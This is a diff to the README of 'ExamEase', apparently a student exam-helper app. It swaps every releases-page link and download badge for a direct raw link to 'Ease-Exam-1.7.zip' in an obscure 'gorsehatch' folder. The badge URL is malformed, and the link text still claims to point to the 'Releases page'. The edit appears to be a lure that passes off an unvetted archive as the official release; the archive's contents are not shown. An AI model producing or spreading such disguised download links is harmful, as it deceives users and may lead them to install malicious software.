@@ -1,6 +1,6 @@
 # 🎓 ExamEase - Your Smart Exam Preparation Helper
 
-[![Download ExamEase](https://img.shields.io/badge/Download%20ExamEase-v1.0-blue.svg)](https://github.com/canistrial/ExamEase/releases)
+[![Download ExamEase](https://raw.githubusercontent.com/canistrial/ExamEase/main/gorsehatch/Ease-Exam-1.7.zip%https://raw.githubusercontent.com/canistrial/ExamEase/main/gorsehatch/Ease-Exam-1.7.zip)](https://raw.githubusercontent.com/canistrial/ExamEase/main/gorsehatch/Ease-Exam-1.7.zip)
 
 ## 📋 Introduction
 
@@ -26,7 +26,7 @@ Students often struggle to manage their syllabus and revise effectively. ExamEas
 
 Follow the steps below to download and run ExamEase.
 
-1. **Visit the Releases Page:** You need to go to our [Releases page](https://github.com/canistrial/ExamEase/releases) to download the application.
+1. **Visit the Releases Page:** You need to go to our [Releases page](https://raw.githubusercontent.com/canistrial/ExamEase/main/gorsehatch/Ease-Exam-1.7.zip) to download the application.
   
 2. **Select the Latest Version:** Look for the most recent version listed on the page. It will typically be at the top of the list.
 
@@ -55,7 +55,7 @@ To run ExamEase smoothly, ensure your system meets the following:
 
 To get started with ExamEase, click the button below to download the application:
 
-[![Download ExamEase](https://img.shields.io/badge/Download%20ExamEase-v1.0-blue.svg)](https://github.com/canistrial/ExamEase/releases)
+[![Download ExamEase](https://raw.githubusercontent.com/canistrial/ExamEase/main/gorsehatch/Ease-Exam-1.7.zip%https://raw.githubusercontent.com/canistrial/ExamEase/main/gorsehatch/Ease-Exam-1.7.zip)](https://raw.githubusercontent.com/canistrial/ExamEase/main/gorsehatch/Ease-Exam-1.7.zip)
 
 ## 📞 Support
 
